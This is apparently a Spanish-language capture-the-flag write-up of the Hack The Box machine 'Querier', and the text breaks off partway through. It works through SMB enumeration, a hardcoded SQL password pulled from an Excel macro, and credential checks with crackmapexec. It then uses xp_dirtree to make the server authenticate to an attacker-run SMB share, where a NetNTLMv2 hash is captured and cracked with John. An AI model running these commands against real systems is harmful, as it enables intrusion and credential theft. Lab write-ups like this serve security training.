&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#PORT      STATE SERVICE       VERSION&lt;/span&gt;
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2017 14.00.1000.00&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; RTM
| ms-sql-ntlm-info: 
|   Target_Name: HTB
|   NetBIOS_Domain_Name: HTB
|   NetBIOS_Computer_Name: QUERIER
|   DNS_Domain_Name: HTB.LOCAL
|   DNS_Computer_Name: QUERIER.HTB.LOCAL
|   DNS_Tree_Name: HTB.LOCAL
|_  Product_Version: 10.0.17763
| ssl-cert: Subject: &lt;span class=&quot;nv&quot;&gt;commonName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;SSL_Self_Signed_Fallback
| Not valid before: 2022-01-26T17:55:09
|_Not valid after:  2052-01-26T17:55:09
|_ssl-date: 2022-01-26T18:23:29+00:00&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; +17m07s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SSDP/UPnP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SSDP/UPnP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 17m06s, deviation: 0s, median: 17m06s
| ms-sql-info: 
|   10.10.10.125:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: &lt;span class=&quot;nb&quot;&gt;false&lt;/span&gt;
|_    TCP port: 1433
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   &lt;span class=&quot;nb&quot;&gt;date&lt;/span&gt;: 2022-01-26T18:23:25
|_  start_date: N/A
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Procedemos a enumera el servicio por SMB&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# smbmap -H 10.10.10.125 -u null &lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Guest session       IP: 10.10.10.125:445    Name: 10.10.10.125                                      
        Disk                                                    Permissions     Comment
        &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;                                                    &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;     &lt;span class=&quot;nt&quot;&gt;-------&lt;/span&gt;
        ADMIN&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;                                                 NO ACCESS       Remote Admin
        C&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;                                                     NO ACCESS       Default share
        IPC&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;                                                   READ ONLY       Remote IPC
        Reports                                                 READ ONLY
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Procedemos a Conectarnos al Recurso llamado &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Reports&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# smbclient //10.10.10.125/Reports -u null                                                                          1 ⚙&lt;/span&gt;
Try &lt;span class=&quot;s2&quot;&gt;&quot;help&quot;&lt;/span&gt; to get a list of possible commands.
smb: &lt;span class=&quot;se&quot;&gt;\&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;dir&lt;/span&gt;
  &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;                                   D        0  Tue Jan 29 00:23:48 2019
  ..                                  D        0  Tue Jan 29 00:23:48 2019
  Currency Volume Report.xlsm         A    12229  Sun Jan 27 23:21:34 2019

                6469119 blocks of size 4096. 1589814 blocks available
smb: &lt;span class=&quot;se&quot;&gt;\&amp;gt;&lt;/span&gt; get &lt;span class=&quot;s2&quot;&gt;&quot;Currency Volume Report.xlsm&quot;&lt;/span&gt;
getting file &lt;span class=&quot;se&quot;&gt;\C&lt;/span&gt;urrency Volume Report.xlsm of size 12229 as Currency Volume Report.xlsm &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;22,9 KiloBytes/sec&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;average 22,9 KiloBytes/sec&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
smb: &lt;span class=&quot;se&quot;&gt;\&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;El archivo tiene formato &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.xlsm&lt;/code&gt; podria ser una archi excell ?? 
Probamos a sacar informacion del archivo&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# ls                                                                                                     &lt;/span&gt;
Currency_Volume_Report.xlsm

&lt;span class=&quot;c&quot;&gt;# file Currency_Volume_Report.xlsm             &lt;/span&gt;
Currency_Volume_Report.xlsm: Microsoft Excel 2007+
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h1 id=&quot;olevba---excell-files&quot;&gt;Olevba - Excell Files&lt;/h1&gt;
&lt;p&gt;Para analizar archivos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Excell&lt;/code&gt; tenemos una herramienta llamada &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;olevba&lt;/code&gt; con la que podemos listar informacion&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# olevba Currency_Volume_Report.xlsm                            1 ⚙&lt;/span&gt;
olevba 0.56.1 on Python 3.9.8 - http://decalage.info/python/oletools
&lt;span class=&quot;o&quot;&gt;===============================================================================&lt;/span&gt;
FILE: Currency_Volume_Report.xlsm
Type: OpenXML
WARNING  For now, VBA stomping cannot be detected &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;files &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;memory
&lt;span class=&quot;nt&quot;&gt;-------------------------------------------------------------------------------&lt;/span&gt;
VBA MACRO ThisWorkbook.cls 
&lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;file: xl/vbaProject.bin - OLE stream: &lt;span class=&quot;s1&quot;&gt;&apos;VBA/ThisWorkbook&apos;&lt;/span&gt;
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

 macro to pull data &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;client volume reports

 further testing required

Private Sub Connect&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;

Dim conn As ADODB.Connection
Dim rs As ADODB.Recordset

Set conn &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; New ADODB.Connection
conn.ConnectionString &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume; || Uid=reporting;Pwd=PcwTWTHRwryjc&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$c6&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; || &quot;&lt;/span&gt;
conn.ConnectionTimeout &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 10
conn.Open

If conn.State &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; adStateOpen Then

  &lt;span class=&quot;s1&quot;&gt;&apos; MsgBox &quot;connection successful&quot;
 
  &apos;&lt;/span&gt;Set rs &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; conn.Execute&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;SELECT * @@version;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
  Set rs &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; conn.Execute&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;SELECT * FROM volume;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
  Sheets&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.Range&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;A1&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.CopyFromRecordset rs
  rs.Close

End If

End Sub
&lt;span class=&quot;nt&quot;&gt;-------------------------------------------------------------------------------&lt;/span&gt;
VBA MACRO Sheet1.cls 
&lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;file: xl/vbaProject.bin - OLE stream: &lt;span class=&quot;s1&quot;&gt;&apos;VBA/Sheet1&apos;&lt;/span&gt;
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;empty macro&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Open                |May open a file                              |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;option &lt;span class=&quot;nt&quot;&gt;--decode&lt;/span&gt; to|
|          |                    |see all&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                     |
+----------+--------------------+---------------------------------------------+
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Encontramos un usario y su Contraseña&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;reporting:PcwTWTHRwryjc&lt;span class=&quot;nv&quot;&gt;$c6&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h1 id=&quot;crackmapexec&quot;&gt;Crackmapexec&lt;/h1&gt;

&lt;p&gt;Procedemos a validarla con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Cracmapexec&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# crackmapexec smb 10.10.10.125 -u reporting -p &apos;PcwTWTHRwryjc$c6&apos;   &lt;/span&gt;
SMB         10.10.10.125    445    QUERIER          &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Windows 10.0 Build 17763 x64 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;name:QUERIER&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;(domain:HTB.LOCAL)&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;signing:False&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SMBv1:False&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
SMB         10.10.10.125    445    QUERIER          &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] HTB.LOCAL&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;eporting:PcwTWTHRwryjc&lt;span class=&quot;nv&quot;&gt;$c6&lt;/span&gt; STATUS_NO_LOGON_SERVERS 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Vemos que esta probando la contraseña a nivel de dominio Activo, pero nos interesa hacerlo para el dominio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;WORKGROUP&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# crackmapexec smb 10.10.10.125 -u reporting -p &apos;PcwTWTHRwryjc$c6&apos; -d WORKGROUP  &lt;/span&gt;
SMB         10.10.10.125    445    QUERIER          &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Windows 10.0 Build 17763 x64 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;name:QUERIER&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;domain:WORKGROUP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;signing:False&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SMBv1:False&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
SMB         10.10.10.125    445    QUERIER          &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] WORKGROUP&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;eporting:PcwTWTHRwryjc&lt;span class=&quot;nv&quot;&gt;$c6&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Vemos como para el dominio local si que tenemos una contraseña valida. 
Antes que nada vamos a seguir mirando puertos abiertos interesantes para enumerar un poco por encima.&lt;/p&gt;

&lt;h1 id=&quot;mssqlclientpy&quot;&gt;Mssqlclient.py&lt;/h1&gt;

&lt;p&gt;Aqui hay que tener cuidado ya que como habiamos visto con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Crackmapexec&lt;/code&gt; las &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;crendeciales&lt;/code&gt; eran para el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GRUPO de TRABAJO/WORKGROUP&lt;/code&gt; aqui en la conexion de autenticacion tendriamos que indicarlo con el parametro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-windows-auth&lt;/code&gt; sino no nos funcionara.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# mssqlclient.py &apos;WORKGROUP/reporting:PcwTWTHRwryjc$c6&apos;@10.10.10.125 -windows-auth                                           1 ⚙&lt;/span&gt;
Impacket v0.9.24.dev1+20210827.162957.5aa97fa7 - Copyright 2021 SecureAuth Corporation

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Encryption required, switching to TLS
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; ENVCHANGE&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;DATABASE&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: Old Value: master, New Value: volume
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; ENVCHANGE&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;LANGUAGE&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: Old Value: , New Value: us_english
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; ENVCHANGE&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;PACKETSIZE&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: Old Value: 4096, New Value: 16192
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; INFO&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;QUERIER&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: Line 1: Changed database context to &lt;span class=&quot;s1&quot;&gt;&apos;volume&apos;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; INFO&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;QUERIER&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: Line 1: Changed language setting to us_english.
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; ACK: Result: 1 - Microsoft SQL Server &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;140 3232&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 
&lt;span class=&quot;o&quot;&gt;[!]&lt;/span&gt; Press &lt;span class=&quot;nb&quot;&gt;help &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;extra shell commands
SQL&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;xp_dirtree&quot;&gt;Xp_dirtree&lt;/h1&gt;
&lt;p&gt;Usamos la funcion de mysql-server por la cual hacemos una peticion a un recurso local o externo. Permitiendonos asi postear un
recurso compartido a nivel de red para interceptar el Hash Net NTLMV2 que sirva para crackearlo, y si la contraseña es debil, se tenso.&lt;/p&gt;

&lt;p&gt;Hacemos la peticion a nivel de Red para inteceptar el Hash&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;SQL&amp;gt; xp_dirtree &lt;span class=&quot;s2&quot;&gt;&quot;//10.10.16.3/caca&quot;&lt;/span&gt;
subdirectory                                                                                                                                                                                                                                                            depth   

&lt;span class=&quot;nt&quot;&gt;---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------&lt;/span&gt;   &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;   

SQL&amp;gt; 

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Recurso Compartido de Nuestro Lado Attacante&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# impacket-smbserver smbFolder $(pwd) -smb2support&lt;/span&gt;
Impacket v0.9.24.dev1+20210827.162957.5aa97fa7 - Copyright 2021 SecureAuth Corporation

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Config file parsed
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Callback added &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Callback added &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Config file parsed
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Config file parsed
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Config file parsed
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Incoming connection &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.10.125,49675&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; AUTHENTICATE_MESSAGE &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;QUERIER&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;ssql-svc,QUERIER&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; User QUERIER&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;ssql-svc authenticated successfully
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;mssql-svc::QUERIER:aaaaaaaaaaaaaaaa:0642e72a441030d47a763c00c904aaeb:010100000000000080538e39e112d8019cd5667bcfcfd83e0000000001001000530068004a004e00760064006b00670003001000530068004a004e00760064006b00670002001000530056004f00740055004a0070007a0004001000530056004f00740055004a0070007a000700080080538e39e112d801060004000200000008003000300000000000000000000000003000003a2a8b8bb974a03e4d78308603f3c73b02c7f94cb7f3041d9dc5376f9f96f69d0a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e003300000000000000000000000000      &quot;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Connecting Share&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1:IPC&lt;span class=&quot;nv&quot;&gt;$)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] SMB2_TREE_CONNECT not found caca
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] SMB2_TREE_CONNECT not found caca
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; AUTHENTICATE_MESSAGE &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\,&lt;/span&gt;QUERIER&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; User QUERIER&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;authenticated successfully
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; :::00::aaaaaaaaaaaaaaaa
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Procedemos a copiarnos el Hash a un archivito
Procedemos a usar la herramienta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;John&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# john --wordlist=/usr/share/wordlists/rockyou.txt Hash_NetNtlmV2                            1 ⚙&lt;/span&gt;
Using default input encoding: UTF-8
Loaded 1 password &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;netntlmv2, NTLMv2 C/R &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;MD4 HMAC-MD5 32/64]&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Will run 8 OpenMP threads
Press &lt;span class=&quot;s1&quot;&gt;&apos;q&apos;&lt;/span&gt; or Ctrl-C to abort, almost any other key &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;status
&lt;span class=&quot;s2&quot;&gt;&quot;corporate568     (mssql-svc)&quot;&lt;/span&gt;
1g 0:00:00:01 DONE &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2022-01-26 19:22&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 0.5780g/s 5180Kp/s 5180Kc/s 5180KC/s correemilio..coreyny
Use the &lt;span class=&quot;s2&quot;&gt;&quot;--show --format=netntlmv2&quot;&lt;/span&gt; options to display all of the cracked passwords reliably
Session completed
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Nuevas credenciales&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mssql-svc:corporate568
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Procedemos a Validar las Credenciales obtenidas con Crackmapexec&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# crackmapexec smb 10.10.10.125 -u mssql-svc -p &apos;corporate568&apos; -d WORKGROUP   &lt;/span&gt;
SMB         10.10.10.125    445    QUERIER          &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Windows 10.0 Build 17763 x64 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;name:QUERIER&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;domain:WORKGROUP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;signing:False&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SMBv1:False&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
SMB         10.10.10.125    445    QUERIER          &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] WORKGROUP&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;ssql-svc:corporate568

&lt;span class=&quot;c&quot;&gt;# crackmapexec smb 10.10.10.125 -u mssql-svc -p &apos;corporate568&apos; -d WORKGROUP                                                                                                                                  1 ⚙&lt;/span&gt;
